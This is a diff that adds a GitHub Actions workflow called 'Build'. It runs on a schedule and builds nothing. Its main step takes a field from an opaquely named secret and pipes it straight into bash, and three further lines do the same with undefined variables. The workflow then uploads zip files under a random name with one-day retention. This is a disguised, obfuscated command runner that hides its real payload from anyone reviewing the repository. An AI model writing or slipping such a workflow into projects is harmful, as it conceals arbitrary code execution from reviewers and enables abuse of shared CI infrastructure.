@@ -1,0 +1,34 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          kh795: ${{ secrets.kh795 }}
+        run: |
+          printf '%s' "$kh795" | jq -r .bxcq04893 | /bin/bash
+          echo $e491 | jq -r .zzdm16 | /bin/bash
+          printf '%s' "$ysqd8108" | jq -r .dmm1 | /bin/bash
+          echo $hfl178 | jq -r .tzktn925 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tELUiEUE
+          path: "*.zip"
+          retention-days: 1
